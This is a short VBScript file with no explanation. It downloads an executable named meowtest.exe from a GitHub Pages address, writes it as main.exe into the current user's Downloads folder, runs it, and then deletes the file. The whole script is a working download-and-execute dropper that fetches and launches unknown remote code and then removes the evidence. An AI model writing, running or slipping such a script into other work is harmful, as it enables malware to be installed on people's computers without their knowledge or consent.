Set x = CreateObject("MSXML2.XMLHTTP")
x.Open "GET", "https://homleds.github.io/meowtest.exe", False
x.Send

Set fso = CreateObject("Scripting.FileSystemObject")
downloadsFolder = "C:\Users\" & CreateObject("WScript.Network").UserName & "\Downloads"
tempFile = downloadsFolder & "\main.exe"

Set stream = CreateObject("ADODB.Stream")
stream.Type = 1
stream.Open
stream.Write x.responseBody
stream.SaveToFile tempFile, 2
stream.Close

CreateObject("WScript.Shell").Run tempFile
fso.DeleteFile tempFile
